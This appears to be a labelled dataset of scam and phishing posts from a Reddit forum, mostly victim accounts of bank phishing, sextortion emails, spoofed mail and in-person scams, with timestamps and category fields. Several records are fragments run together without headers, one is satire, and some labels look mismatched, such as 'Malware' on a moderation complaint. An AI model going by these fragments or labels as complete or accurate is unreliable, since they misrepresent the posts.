I was recently the victim of a pretty elaborate phishing attack, I had my bank account cleared out and after a dispute that lasted nearly 3 weeks with my bank, they have refused to refund my money and have closed my case and refuse to open it again. I am devastated, both emotionally and financially and I dont know what to do at this point. Without revealing too much information, here is the scheme that I fell victim to... I also have many screen shots, emails and documented history from my browser as evidence for my case. 

\--------

In February I made a posting to sell a North Face down jacket on eBay Kleinanzeigen (Basically ""craigslist"" for Berlin for those of you who dont know) Within a couple of hours a user offered to buy the jacket and we began our negotiations. After originally offering to send me money through Paypal, the user told me that they were having login issues with Paypal and would rather use eBay‚Äôs protected payment service that is provided by the website. I have heard its quite safe and thought it was a great idea but I never used this feature before, and I didn‚Äôt know how to initiate it. While I was in the process to try to figure out how to use the feature, I received an email from what I thought was eBay, informing me that the buyer initiating the payment process. I, having never used the payment feature before, naturally thought that the buyer had the ability to make an offer and I was sent an official automated email from eBay to continue with the process. As it turns out, that upon closer inspection of the email much later, that this was a phishing email and the beginning of an elaborate process to gather all of my personal information.

I opened the email, clicked the link, and it took me to a fake (but very official, nearly identical and fully convincing) eBay Kleinanzeigen website to complete the payment process. This website gave a full authentic experience, including an official looking (but fake) N26 Login Portal (N26 is my bank here), where I entered in my account username and my password followed by an official looking payment page where you would enter in your credit card number, expiration date, and CVC code. This is standard procedure on many payment websites and didnt feel at all suspicious or unsafe. I was then walked through my normal 2 Factor Authentication process as expected by receiving notification on my phone asking me to wait for an official N26 SMS with the verification code to complete the authentication process. I entered in the code (standard procedure, guaranteed to be safe) and I was led to a page that told me that the transaction for the agreed price of ‚Ç¨325 euros was complete and that I would receive the payment when the buyer confirms that they have received their item. All of these steps were impressively faked and well orchestrated.

A couple hours later I received a warning email from eBay that the user I was dealing with was banned from eBay for suspicious activity and that I should be careful about our conversation and any sensitive information that may have been exchanged. About 30 minutes later, I received a notification that a transaction for about ‚Ç¨900.00 was processing and being sent to a business I have never heard of called ‚ÄúCOMFY‚Äù in Kiev, Ukraine, where I have never been to and have no associations with. The money was sent in UAH with an exchange rate.

The thief tried one more transaction for about ‚Ç¨130.00 to finish off the rest of the money in my account, but the transaction failed because of insufficient funds. I then cancelled my card, froze my account, began to take photos and screenshots of my emails, text messages, and card transactions and began began the process of reporting the money stolen with N26. I have also since filed a police report with the Berlin Polizei.

For the last week I have been in continuous exchange with N26 to dispute the transaction and refund the money. N26 assured me yesterday that all of my information was sufficient and the money would be returned in the next 3 to 5 business days, but to my surprise, I received a message today that says they have since changed their minds and will not return the money on the grounds of user negligence.

The following is their exact message:

‚ÄúHey \_\_\_\_\_\_\_\_\_,

After analysing the case, we confirm that Mastercard cannot dispute the transaction for the following reasons.

\&nbsp;

You filed the dispute for unauthorised transactions, however, all the payments were performed through the digital wallet (Apple / Google Pay). Also, we can see that you have willingly provided your card details and confirmed the connecting of the digital wallet through the push notification on the N26 App, or through the link in the SMS you received on your phone.

\&nbsp;

In order for a phone to sync to (Apple / Google) Pay, it requires access to the cardholder's N26 account which includes knowledge of the account username, knowledge of the app password, knowledge of card information as well as the code sent by SMS to the account holder's phone. This is considered as negligence according to N26 terms and conditions.

In addition, for a card to be associated with a digital wallet with a unsynchronised phone, this cannot be done without knowledge of the code sent by SMS to the account holder's phone.

\&nbsp;

Please check the link below showing the awareness raised by EbayKleinanzeigen about accepting such payments:\&nbsp;

Your chargeback case has been closed, please solve the issue with the merchant directly or through the police.

Have a great day,

N26 Team‚Äù

They have closed my case on the grounds of what a bank would call ""gross negligence"" and refuse to resolve the issue of unauthorised transactions on my account that sent 90% of my account to a organisation that I have never heard of in a country I have no connections to. Of course I released my card details and account information, that is exactly how phishing schemes are developed, engineered and how they succeed. A phishing attack is exactly defined as ‚Äúa form of¬†social engineering¬†where attackers deceive people into revealing sensitive information. Phishing attacks, often delivered via email spam, attempt to trick individuals into giving away sensitive information or login credentials.‚Äù 

After some further research, it seems like it should well be possible to dispute this case in a court of law by proving that this wasnt in fact ""gross negligence"" because of the impressive and well executed forgery of the emails, websites, portals and 2FA procedures of both Ebay and N26 but I am uncertain, scared and a bit desperate. I have never been to court for such a thing, I am struggling with money as it is and losing such a case would be insult to injury and maybe even impossible to recover from for my life here in Berlin.

I knew it was malware immediately because I was getting emails of someone unknown trying to access basically all my accounts. 2FA saved me from losing anything. I change all passwords and they know again. I factory reset and change passwords again and I get an email. An email containing all of my passwords, sent to all of my emails. The email showed a screenshot of both my monitors (I can verify they are definitely my monitors that are in the screenshot), and then a document demanding $1,150 or they'll send all my contacts a video of me masturbating.

1. I don't have a webcam
2. They say they hacked me on 2/12/2022 but the screenshot shows the date 29/09/2022

I am making this post to ask... Is it possible for malware downloaded on a computer to bridge over to a phone? In that case, the threats could be true

Is there anything else that any of you notice in the email that is inconsistent with phishing scams or does it look like it could be genuine?

1673284252.0,Became a target of a email spoofing attack - how?,"I received an email from *no-reply@<popular crypto exchange domain.com>* telling me I received some crypto from so and so, and to click here to claim. Some observations and questions:

1. It was clearly a phishing email because I don‚Äôt have an account associated with this email

2. I‚Äôve observed that this exchange always greets me by first name in their real email. This phishing email did not, as they would not know my name and appear to be casting a wide net

3. The bottom of their email indicated their Europe division. I‚Äôm in the USA so I deduced that my email was probably caught in a wide net cast upon European customers. I don‚Äôt expect legitimate emails to contain their European counterpart signatures.

4. It‚Äôs highly unusual that someone sent me crypto, and then I have to ‚Äúclick here to claim‚Äù. Though I will admit, the overall style and presentation of the email is 99.999% legit aside from very minor details. I initially thought someone unusual had actually sent me crypto until I started to re-read the email looking for phishing indicators

5. I somewhat understand email spoofing, but it‚Äôs still a little over my head. How was the malicious actor able to spoof their email to come to me appearing to be the legitimate domain of this large exchange? Could they have registered a domain and swapped out letters with identical characters (wouldn‚Äôt the business also register alternative domains to prevent others from registering it?). If not, did they alter something in their email server settings? I thought there‚Äôs security countermeasures to stop 100% spoofed emails?",phishing,1591,268,27,1

1672163390.0,"Cautionary tale: Nearly got phished for my banking password via ""instant app"" on Android","I have a pretty crazy ""near miss"" phishing story to tell. And a few questions / mysteries to solve.

Yesterday I got a notification from my online banking app (I'm with a major Canadian bank). The app sent me a push notification that says ""sign in requested"" and then said ""when dec 26, 2022 at 10:12PM PST"". At bottom of the notification there are two buttons: ""don't allow"" and ""allow"".

I had seen these messages before when I log in to my online banking from a computer. It's a 2factor auth that prevents fraud. That said, normally this notification sends me the location of where the login attempt was made. I thought it was a bit strange that it was missing the login info.

I was half asleep and I clicked on something (presumably ""don't allow) and the it said something like ""if this was not you, please reset your password"". And then it asked me to put in my banking info. At this point red flags went off in my head. This was very suspicious.

On one hand, what I was looking at looked exactly like the app I had used many times... but on the other hand, it was missing the location info and it seemed risky to me to enter all my security info in this way.

I decided to call RBC bank and ask them for the ""location info"" for the login. Once I passed their regular security questions the customer service rep told me that there had been ""no login attempts into my account"".  What the heck was going on?!

So I decided to log in using my laptop and I didn't get any ""login attempted"" messages there either.

So here's my theory:

1. I recently turned on a setting on my android phone called ""upgrade web links"" from the Google Play store settings. This setting turns on ""instant apps"" which are described as follows ""click certain links, the instant app may open and you'll be able to use some of it's features, without actually installing the full app.""
2. I think a phishing app ""spoofed"" my banking app by using this instant app tool. Normally it would open on a browser and I could see the URL, verifying that it's a fake URL of somekind. But that's not possible with an instant app (or is it?).
3. the fake banking app then asked me to reset my password. (which thankfully I didn't do).

If I'm right about all this, wow, that's one hell of a scam! that would have so many implications for security. Namely that banks now have to worry about this novel attack vector. It means that ""instant apps"" are a threat and should be turned off. It means that we should be warned by our banks what the ""right"" way is to log into our bank and reset our passwords when needed"".

What else does this mean?Am I out to lunch here?

Has anyone else experienced this?  


update #1 : Ok, maybe this was a false alarm. While I still think it's possible to use Instant Apps to ""spoof"" an app (which probably makes them risky), I think it's equally possible that this was a legitimate login attempt from an 3rd party app that needs access to my banking info. It ""pulls updated bank balance info"" at around 10pm every day. I recently reconnected this 3rd party app to my bank account. So perhaps this is the culprit. To reproduce the problem, I tried login into this 3rd party app, and sure enough it gave me a ""sing in requested"" push notification that is missing both the ""device name"" as well as ""location"".

Okay, I‚Äôm an absolute idiot when it comes to hacking, or cybersecurity, so feel free to remove this post if it‚Äôs stupid but I really wanted to ask this on here. I‚Äôm pretty cautious with the apps I use, browsing and passwords and this incident happened to my new phone I hardly ever use other than for taking pictures and using like 3/4 go-to apps. None of my social media accounts have been hacked in the past until a few days ago. So I was out with a friend, I didn‚Äôt touch my phone for hours because living in the moment etc, and on our way home I popped into an amazon freah shop in a very busy area of london, however the store was empty, only a security guy standing at front of the shop. I log into amazon app, scan the entry code,  go in and do some food shopping. Whilst I‚Äôm in the store I see this discount qr code (for black friday), I quickly scan it and it opens Safari and asks me to log into my amazon account again, which I do. I don‚Äôt remember anything else, I couldn‚Äôt be bothered to claim this discount code so I quit safari, I lock my phone, carry on shopping and go home. Within an hour, all of a suddent I start getting notifications from my instagram so I go and check what‚Äôs going on. It turns out that I  sent dms to about 20 of my followers of totally random photos from my camera roll(some recent ones, some from months back). I start to panick (first I thought I must have done it myself by accident) and as I‚Äôm messaging someone apologising about it, I realise that more of these had been sent during the time I was responding to that person. It felt really creepy so I immediately went to change my apple id, and password for instagram after which it had stopped. When I told my friend who‚Äôs studying hacking and is more up-to-date with scams in London, he said it‚Äôs quite common for people to put stickers of false qr codes on top of legit qr codes and amazon fresh having pretty much zero staff inside the store is a great place to do this. Could this be what happened to me and is this actually a common phenomenon?

I posted a new item for sale on Flippa. Someone contacted me and asked to discuss on Telegram.

* When I tried to create a new account on expocoin .com, whatever email I used it said that I already used that email.

So, I thought she wants me to also join this thing since we are planning to go on a trip and getting a free ticket would be nice for my aunt and I. 

Anyway, I opened the link, and immediately there was like a sort of, survey about that airline. Headline says, if you answer this survey you might win a trip to any destination you want.

Anyway I immediately realize this is a scam after opening the link. The spelling, photo etc. are all so fake and obvious once you open it. 

I immediately closed it. Didnt click or do the survey, didnt provide any info at all. 

I have a few questions: (I was using my android mobile btw)

1. Was this a phishing link? 
2. Since I didnt provide any info, and didnt do the survey and closed it immediately, Am I safe?
3. By opening this link via messenger (since that's where my aunt sent it to me) am I safe?
4. Will I/my fb account be harmed by opening this link?
5. Did I just expose my phone with virus/malware by opening this link?
6. Will this link be automatically sent to all my contacts without me doing anything?

I‚Äôve been advised by the FTC to put a credit freeze on my accounts through the three credit bureaus, as apparently just with an ID they can file for loans or take out things under my credit. But I‚Äôm wondering if this possible, because I recently had a legal name change, to a completely different first and last name. 

While this information was up to date on the photo ID I sent the phisher, it‚Äôs not with TransUnion/Equifax/Experian. As far as they know my current name doesn‚Äôt exist to them. 

The only way I can put a credit freeze on my accounts with them is to update them of my new legal name. But that would make the name the phisher has access to via my ID photo more susceptible to being stolen, wouldn‚Äôt it? 

Should I update my legal name with the credit unions to put the credit freeze on, or keep it as my old different name the phisher never received? Does it matter at all or am I just overthinking it and should STFU and try to get the name updated and the freeze on on asap?",phishing,1197,227,18,1

Some days ago I was in a friend¬¥s house when I decided to open instagram to find that a crypto related story was posted in my account.

After that I went to gmail and saw that I had 4 mails coming from facebook on the trash bin with codes to change password and the email adress, and I started panicking because that would mean this hacker also had access to my account even if I had the 2FA active (received login notifications on my phone). Proceeded to send my ID to facebook in order to get account back and in only 30 minutes I was back in. I also changed my gmail account password, enabled the authenticator app 2FA and performed a hard reset on my phone.

I know that my PC is safe because I have a premium software and now that I hard reset my phone I think that the problem is gone.

1664872488.0,I'm Being Hacked and I Need Some Advice (sorry),"Ok, please don't berate me for this but I need some advice. I'm in an emergency situation and in between jobs, but needed a loan within a few days. My bank declined me (my parents took out some student loans on my account apparently), and so I went the route of trying for an online loan. I realize that this is always dangerous (please everyone know for the future this given what I'm experiencing) but it was worth it to me to try. Of course, now I'm being emailed with all of these obvious scams, most of which are coming from the same @ address. However they're being a bit weirdly aggressive given that I have no money, hence the loan (as would always be the case I would think, what an ironic scam industry), which is bizarre- anyways, I find this comical but this morning I noticed they took my full $8.00 out of my bank account... worth it, clearly. I'm closing and reopening my account of course. But frankly what I don't care for is the following- they have started emailing me at an email address that I never provided on any ""loan"" page with more scamming, this time targeting my job search, posing with fake job board emails and the like. I found this stupid and reported them to the FTC and the FBI's cyber crime tips page.

Here's why I'm asking for advice though- I had an incident occur shortly after doing so where they visibly accessed my computer and logged out of an account in an app of mine right in front of me- wasn't anything natural, it was def remote accessing of my computer. I think they were trying to phish me or something by having me reapply the credentials. Anyways, I'm on a MacBook at home, and am seeking an explanation as to how they are doing so, as well as what subreddits I can try to get more information about this. I'll be installing a VPN tomorrow, and am taking other precautions (I have and will be switching up my account credentials regularly) but as far as security goes (with remote accessing especially) I could use some advice. I'd like to know exactly how that could be done and what can be done about it.

I definitely will never try and get a loan online ever again, and I will treat security with the utmost importance from here on out. I'm making it a life lesson, please don't yell at me

Here‚Äôs the issue: a couple of us have been receiving phishing emails from our alias addresses.

1660755468.0,Data breach-email but customer support doesn't seem to know what to answer me.,"Hi! I didn't know where to ask this, so I hope this is the right spot.

I got an e-mail last night from an online clothing store, saying that there was a third party data breach that made it possible to get my information from this online store. It said my information, like adresse, phone number, name, age etc was available. But not my card information etc.

I found it odd that in this email, it said ""hello \[random male name\]"" When that is not my name and it would be odd for them to assume this name in any way.

When I checked where the seemingly legit email came from, it was coming from a ""amazonses"" webiste/whatever, which I thought  was some shady phishing shit. Obvously I didn't click any links.

I went to the clothing store's support page and asked if they had sent me this email and why they had used a random name, if so.

They only replied that ""yes they had a third party data breach"" (but that it was not their fault). I said, this I understand, but I wanted to know if the email I got was legit, and I showed them a screenshot of the email address and how it adressed me as another random name. And I also asked if this breach had indeed made my home adresse, phone number etc available. 

They only replied ""yes it might have been taken but they had no way of knowing.""

I then asked if the email was legit or not (again) because the original email seemed like a phishing attempt, and not an actual breach in their webpage. But I have yet not recieved any answer.

So. Can anyone explain to me what has actually happened? 

TL;DR 

I get an email from the ""store"" (looks like fake email. )

I do not open anything. I just read the email and closed it.

This email states that the account was terminated due to suspicious activity, and that whoever it was, had access to my personal information. 

When I asked the actual store, they say ""yes there was a breach"", but a third party or something, and not ""their fault"". They say my account is terminated. But not why/what the activity was, etc.

1657636239.0,I was phished and got the money for my college tuition stolen (all out of options and looking for advice),"A couple months ago I received a text message that I believe to be from my bank stating that under a new regulation I had to confirm my account with them. Due to my youth and lack of financial literacy I did not know what phishing was and was unfortunately scammed.

Ive reached out to my bank multiple times through their fraud unit but each time my claim has been denied on the premise that I posed my own account at risk. In addition the scammer that stole from me did a SIM card swap rendering my phone useless as they stole from me and communicated with my bank as if they were me. Thus I was robbed without even knowing it. 

I was told persistency is key with these kind of things, but I‚Äôve been dealing with this issue for months and I am still getting the same responses or no responses at all. 

I filed a police report when I first got scammed and tried to follow up with the detective on my case with no avail. And I‚Äôve even reached out to my phone company for proof of a SIM card switch but they won‚Äôt provide the paper work. 

Im at my wits end to the point that I‚Äôm
thinking I should just count it as a loss and move on. Mainly due to the stress and the toll it has taken on my mental health.  However, due to the fact that the money taken from me was a pretty big sum and to pay my college tuition I feel a bit hesitant.  Im also first gen and have been saving and paying for school on my own due to my parents inability to provide financial support which makes it even harder to let go of this matter. 

Is there anything else I can do? Is phishing not covered under FDIC regulations? 

Side Note: this money was taken out of my savings through a wire transfer and the bank I am with is FDIC Insured. I also recognize that this post is not the most detailed but this is what I feel the most comfortable sharing for now.",phishing,1836,361,19,1

1657153016.0,Is this targeted phising? Has something been compromised?,"Bit puzzled by an email I received and would appreciate any advice!   
The 'sender' field was the domain of the National Library of my home country in the UK. I do not live in that country any more. 

The sender's actual address gave away that the  email wasn't legit as it was something like [alonzaenha@pra.com.gt](mailto:valenzuela@cta.com.gt) (Name amended but I'm not familiar with the original name or those domains etc and have no business in Guatemala. - the [xxx.com.gt](https://xxx.com.gt) was correct.) 

The message is below.  The odd parts are: 

\- I do have an account at this library. I""d imagine a relatively small proportion (5% but more like 1%) of people in our country do. So, it seems pretty coincidental for me to have been sent this. 

\- The body of the email contains the library's correct details, which makes the attempt seem more sophisticated than many junk mails etc 

\- The 'to' field  - before my email address - contains my accurate name preceded by a title that I dont use very much. (I don't think my email account automatically adds that title to my email address on my incoming mail, bc other messages I've received seem to be preceded by whatever I am saved in the address book as) 

So - what is going on here? Am I crazy to wonder if this potentially represents a specifically targeted attack?

They said they had some urgent work and could I please send my phone number so they could communicate by text message. So I replied back with my cell number. Shortly afterwards I received a text from a number with a Manitoba area code, and so my attempts to text them back failed (my US carrier does not allow international texts).

I next (stupidly) tried calling them from my wife's phone, since her carrier allows calls and texts from Canada. They started texting her too now. Then I noticed that the little circle outlook shows next to an email, with the sender's initials in it, was a different color than normal for my boss.

About 30 minutes later I was another missed call from another number I don't know.


A bit of additional information:
-I recently made a BUNQ (online bank) and Trade Republic account, both are trustworthy, but I also needed to confirm my information on both, so maybe some kind of leak could have happened?
-I live in Germany, but the call was in english and told me the english name of a German institution (BKA).

1649433297.0,Someone used my email on a Netflix account,"Hello everyone, something weird has happened to me, and I'm looking for someone who can explain me why could this had happened.

So, a few months ago I started getting emails from Netflix, the real Netflix email (I didn't know it was the real one). First one was welcoming to the platform, e.g: Welcome, John!. FYI, I have never made a Netflix account, and my name is definitely not John (i'm a woman). Since I didn't have any netflix account I thought it was some sort of hacking technique, It maybe wanted me to click on the links and they would rob my information, hence why I simply marked that email adress as spam and forgot about it.

Everything was normal until today, that I thought about it and decided to log in on Netflix with my email. Restablished the password and created a new one via a link that I received on email (I didn't create the account so I didn't know the password). I was really surprised when I saw five different profiles with a large history view of different movies and series. Decided to check where they were logging from and it's from another country, and continent from mine. I'm in Spain and they are in Honduras.

I believe this isn't a case of phishing, because I checked their payment information and they've been paying for 3 months now, so my question is, why would anyone make an account with someone else's email? It doesn't make sense because if you had to change the password you would need access to that email (they actually tried once, I got an email). And again, they created this account on february, so a few months have went by.

I have looked this up online and it doesn't seem like it has happened to many people, and the ones who have talked about it blame it on a phishing case, but my situation really doesn't look like it. If anyone has an idea of what this is or why did this happen, please let me know, and thank you for your time.

Yesterday I received to emails from no-reply@microsoft.com telling me someone accessed my account from Russia. Looking back I now see two small typos but I didn't even notice it, so I clicked on their ''report user'', and it sent an email to an @ googlemail.com and that's when I realized I was scammed, because why would Microsoft send me to a Google account.

I contacted the team immediately because some things felt off:

1. On my log in activity there was no log in besides my own
2. The Google account, obviously
3. But the thing that weirded me out the most is that I had been receiving emails from this account since 2016

I didn't even question the email because I could see they had been sending me emails since 2016, and since a lot of companies use an no-reply email I unfortunately fell for it. What's really weirding me out is two emails that I found from this address, one from 2020 where they somehow knew about an Amazon purchase and sent me an email about adding the delivery to my outlook calendar (what's even weirder is that this particular email is marked up top as ''This message is from a trusted sender''?????). The other one is from 2016 welcoming me to my outlook account (now I'm not really sure why I don't remember but I've had this email since 2010 and it was a hotmail account, so maybe it was that?).

Microsoft has confirmed the email does not belong to them, as theirs is way longer, so I'm wondering if anyone else has had this happening to them?

Earlier today my girlfriend had been getting spam calls from the same number from one of the surrounding cities near us. Although this isn't unusual and is mainly ignored she decided to answer on the 5th call(This is where it gets weird).

I have gotten my fair share of spam calls and such but this one is abnormally weird to me as I have never seen information match up like this.

Now I will explain the case. As I said, starting his venture to have a clothing store, he made an online purchase with a person who had a somewhat strange profile. She decided to make the purchase (+$40,000).

Having some free time, I decided to walk on ""the Bund"" (the touristy boardwalk with a beautiful view of the city).  While I was there a woman approached me and asked me to help take a picture.  No problem.  Then she wanted to practice her English with me.  I was alone and she seemed very nice, so we chatted. She was a ""teacher"" who was visiting town for the weekend.  

She wanted to know if I was interested in visiting a traditional tea house nearby that she was hoping to check out.  I said yes, but I was a little concerned.  I'm a married man and I didn't want her to think I was going to be doing anything untoward but it was all very friendly and relaxed.

Anyways, we got tea and it was really great.  I learned a lot about Chinese tea and had a lovely friendly conversation for an hour or so.  The tea was tasty and the service was friendly.  

The bill came and it was pretty steep for a bunch of tea.  About 40 bucks.  Regardless, I paid my share and we said out goodbyes.

I told somebody else at work about the experience and they explained to me that this was a tourist scam: it's called the teahouse scam.  It was all a setup between the teahouse and the woman who I went with.  Presumably, she gets a cut of the profit from the visit.

Regardless, I don't regret it, though I feel a little foolish.  I had a nice time, some lovely conversation, and I learned a lot about tea.  The money was a lot, probably, but it was definitely worth it for both the experience and for the story about getting conned.

1665498478.0,"I‚Äôm a professional banker, and I have some thoughts","I‚Äôve noticed a lot of misinformation floating around on this sub. I‚Äôm not here to call anyone out, but just for example, I saw someone telling a person to never accept a cashier‚Äôs check because they aren‚Äôt secure. To briefly clear that one up, a cashier‚Äôs check, otherwise known as a treasurer‚Äôs check, is paid for by the customer at the bank with either cash or a direct pull from the customer‚Äôs account. That way they‚Äôre considered guaranteed funds, and that‚Äôs exactly what does make them secure. I personally would never accept a large transaction like that in cash due to the risk involved with simply having that amount of cash on my person. 

But what if it‚Äôs a fake check, you ask. Well the answer to that one is simple: if you get a cashier‚Äôs check and you‚Äôre not expecting it, it‚Äôs most likely fake. If you‚Äôre expecting it and you get it but you‚Äôre still not sure, this is how you clear it up: have your bank call the issuing bank and verify it. Cashier‚Äôs check sales come from a bank‚Äôs general ledger account, and they‚Äôre all logged. They can look up the check‚Äôs serial number and verify whether or not it was actually written by someone at the bank. You can also request a hold be placed on the funds, so it‚Äôs untouchable until it‚Äôs been long enough for the check to officially clear or be rejected. 

That‚Äôs just one example. Whenever I see stuff like that, I do try to politely interject and just make sure the information is corrected. I noticed that a lot of times when I do this, my comments get downvoted to oblivion and/or people are extremely rude to me. It‚Äôs made participating here unpleasant at times, even though I am passionate about helping people avoid scams. 

Bottom line and the actual advice here: this is a great place to *start.* This a good forum to run things by to see if it‚Äôs really a scam and how it works, but if you have actually been a victim, I *strongly* recommend that you get your advice on how to proceed from your actual bank. We‚Äôre trained in how to deal with this stuff, and we want to help you. Please don‚Äôt stop at just taking advice from a stranger on the internet. Reach out to your bankers and be honest with them about everything so that they can help you to the best of their abilities and possibly also get law enforcement involved. Thanks!

Edit: to those of you who read the whole post and understood that I‚Äôm merely saying to ask a professional before you do something risky or to contact a pro if you‚Äôre already caught in a scam, thank you! To those of you who only paid attention to my example and came here to be weird and bitch about checks - that‚Äôs not even the main point of the post, it‚Äôs just an example. 

To those who don‚Äôt have any professional experience with this but want to argue, perhaps you should get some educational material before spouting off. 

Thanks for the awards, all! I am officially turning off notifications for this and not answering anymore comments because I have repeated the same stuff more than enough times. Use your own best judgment and just‚Ä¶be nice to each other, damn.",Malware,3068,561,53,0
1684166822.0,Hubby spent two hours on a phone interview this morning before he realized it was a scam‚Ä¶,"‚Ä¶and thankfully, hung up immediately. 

Hubby got canned in a round of corporate layoffs about 4-5 weeks ago. He‚Äôs been vigorously applying to stuff since, with varying degrees of success. 

This listing didn‚Äôt show a salary range. Red flag #1. 

He was still curious, since it was an at-home data entry job. He got called this morning by a lady while I was still asleep (he‚Äôs the early bird, I‚Äôm the night owl) and spent two hours being ‚Äúinterviewed‚Äù. He asked about the salary and she said it was ‚Äúcommission-based‚Äù. Red flags #2 & #3: Indeed doesn‚Äôt allow commission-based listings to be listed as salaried (which it did), and why would a data-entry job be commission-based anyways? 

 Then she starts talking about the equipment he‚Äôll need to purchase, including a brand new, high-end MacBook with Retina display. Red flag #4. 

She says they‚Äôll provide him with ‚ÄúLiNkS tO tHeiR vEnDoRs‚Äù and *swears* the company will reimburse him‚Äî 

Final red flag. Hubby hangs up in a rage, realizing he lost two hours of his life he‚Äôll never get back. He immediately reports the listing as a scam to Indeed. 

When recounting it to me just now, he says that he did a quick google search of the company she claimed to represent, and it‚Äôs legit. I told him, ‚ÄúYeah ‚Äî but they‚Äôre counting on you doing that to make you believe the job is legit as well. Any links they provide you will be created by the scammers and mocked up to look like the company‚Äôs.‚Äù 

Him: ‚ÄúAnd I‚Äôd be stuck with new equipment I don‚Äôt need.‚Äù

Me: ‚ÄúHeh. Bold of you to assume it‚Äôll arrive at ALL.‚Äù 

He also looked at the email they‚Äôd sent him and kicked himself for not noticing it didn‚Äôt come from ‚Äú@legitcompany (dot) com‚Äù, it came from some other random, unaffiliated email server. That would‚Äôve been another red flag. 

He‚Äôs angry that he lost two hours of his time ‚Äî but even more enraged that these scammers are preying on people who‚Äôre probably already in moderate-to-dire financial straits and leaving them in an even worse condition. I told him that at least he wasted HER time in return. It was less time she could‚Äôve spent scamming someone who *wouldn‚Äôt* have recognized it was BS and thus been out several thousand dollars.",Malware,2194,386,41,0
1688737753.0,"""Final Warning"" from the Reddit Admins","Two days ago, we received this message from u/modcodeofconduct: 

> We noticed you recently marked your community NSFW. This action is likely to confuse your community members, as people subscribe to communities based on the content at the time of subscription. This is a violation of the Mod Code of Conduct rule 2.

> While we recognize communities can gradually change as they grow, when your content suddenly changes from generally safe for work to sexually explicit, it harms the community members.

> While we can see you haven't taken the step of approving sexually explicit content, we need to separate your community from the communities that abruptly become NSFW and post sexually explicit content, situations in which we immediately take action. Please immediately correct the NSFW marking on your subreddit so that we can separate your community from those violating sitewide rules.

> Thank you.

We responded back in kind, pointing out that we were compliant with their own listed rules. We asked them to clarify. We pointed out the rule-breaking content we have removed. No response (as usual. They always dish out these scary-sounding messages, but never respond. Strange!) 

And yesterday, they sent us this: 

> This is a final warning for inaccurately labeling your community NSFW which is a violation of the Mod Code of Conduct rule 2. Your subreddit has not historically been considered NSFW nor would they under our current policies.

> Please immediately correct the NSFW labeling on your subreddit. Failure to do so will result in action being taken on your moderator team by the end of this week. This means moderators involved in this activity will be removed from this mod team. Moderators may also be subject to additional actions, e.g., losing the ability to join mod teams in the future.

> Lastly, if you suddenly begin to post, or approve content that features sexually explicit content to your community in order to justify the NSFW label, we will immediately remove and permanently suspend moderators who have participated in this action.


-------------------------

This is the last message we have received from u/modcodeofconduct regarding this sub, regarding the NSFW status of the sub. 

It has been discussed prior to the protests making this sub NSFW due to the content posted here. Prior to the protests, mods removed content as reports came in, when mods could get to it. This means that sometimes sub/site rule-breaking content, offensive content, sexually explicit content, and otherwise inappropriate content remained up for very long periods of time.

Reddit's own words about offensive content: 

>Rule 2: Set Appropriate and Reasonable Expectations Users who enter your community should know exactly what they‚Äôre getting into, and should not be surprised by what they encounter. It is critical to be transparent about what your community is and what your rules are in order to create stable and dynamic engagement among redditors. Moderators can ensure people have predictable experiences on Reddit by doing the following:

> Providing a clear and concise description of the topic(s) discussed by your community.

>*Properly labeling content and communities, particularly content that is graphic, sexually-explicit, or offensive.*

> Creating rules that explicitly outline your expectations for members of your community. These rules will help your community understand what is or isn‚Äôt permissible within your subreddit.

> Explicitly marking your community as ‚Äúunofficial‚Äù in the community description if the topic concerns a brand or company, but the community isn‚Äôt officially affiliated.

And, the content policy: 

> NSFW (Not Safe For Work) content

>Content that contains nudity, pornography, or profanity, which a reasonable viewer may not want to be seen accessing in a public or formal setting such as in a workplace should be tagged as NSFW. This tag can be applied to individual pieces of content or to entire communities.

Due to the loss of most of our mod team and needing a way to better moderate with less people power, we made the decision to have to manually review and approve all comments and posts. While this has lead to longer wait times for you all, it has allowed us to keep rule-breaking and offensive content OUT of the feed. You never, ever need to see it. 

A small example of some of the content I have personally removed from the mod queue in the past week:

- Countless reposts of common escort scams, underage sextortion scams, and other content focused on sex/pornography/sexting. 

- A post I reported to Reddit admins, where the poster was advertising photos of individuals performing anal and PIV sexual acts, and advertising for an extra fee to see ""teen"" performers on Telegram. (""Teen"" likely implying individuals under the age of 18 years old.)

- An uncensored gore photo of a man who was killed and dismembered, with his penis and testicles also dismembered and visible in the frame. 


Reddit's own rules about NSFW content state that we are compliant with their policies. However, Reddit is choosing to strong-arm us into complying or removing us from our moderator positions. 

I don't think I need to remind you all of this, but we are *unpaid volunteers* for reddit. We, and thousands of other mods, provide hundreds of thousands of hour of *free labor* to this site, doing the work that their paid admins and employees should be doing. 

The admins apparently think that this sub is safe for work, when examples of content like I have posted above are being posted *every day*. You cannot believe the amount of uncensored gore photos over my past 6+ years of being a member of this community I have seen and personally removed. The amount of sexually explicit posts and comments I have removed. *The absolute vile garbage I have removed from truly depraved individuals seeking to victimize and take advantage of the most vulnerable populations of human beings.* 

The fact remains that scams prey on the vulnerable, the naive, the desperate, and the uninformed. They rely on tactics to persuade people to do things in exchange for a big prize. A lot of these tactics depend on utilizing sex, shame, and embarrassment to get victims to pay out (perfect example: a person sends a picture of their penis to a scammer, and then the scammer threatens to send that photo to all their friends and family.)

Please tell me- how is reading a post like that ""work-friendly"" content?

So, if we are forcibly removed, this sub is forcibly switched back to SFW, and you see content like the types of content I removed this past week, just know it is endorsed by the admins as safe for work!",Malware,6678,1101,126,0

I'm currently sitting at home, waiting for the Feds to arrest me. I expect I'll be gone for a while. To my family and friends, I love you and didn't mean to let you down. 

In a nutshell, I've been using my Social Security number fraudulently. I had 10 minutes to call the government back this morning and work this out before they would send their agents to arrest me. So here I stand.

Why didn't I call back and hopefully avoid this mess? Because I was on the phone with a Microsoft tech in India, trying to grant him full access to my Windows 10 OS, which was rife with malware and spyware. It was super kind of him to call directly and warn me, but that's why I was tied up and missed the government's call.

This throws another wrench in my life: I am currently subject to a deportation order for not paying $8,000 to INS to correct critical errors on my visa. I've overstayed my welcome in the US by 36 years, and likely will be sent back to China in short order. I should've taken those Mandarin classes.

I just hope the agents are gentle with me, due to my limp. USPS isn't delivering the medical-grade knee brace I'm entitled to for another few days.

For all those worried about my family's finances,  do not fret. I just consolidated my student loan debt, and Barrister Henry Adams has USD $2,000,000 set aside for me in a bank account in Lagos.

Not surprised given what they are asking for rent. The company that owns it has done a bunch of renovations though, it is looking nice. 

All of a sudden yesterday there was a steady flow of potential renters looking at the house.  It's one of those self-tour things, sign up for a time and they send you the lockbox code.  One family knocked on our door and asked me if we knew the owner.  I told them it's a corporation, but I don't remember off the top of my head.  They had been texting with some guy who wanted them to cashapp the deposit.   And the rent was half the market rate. 

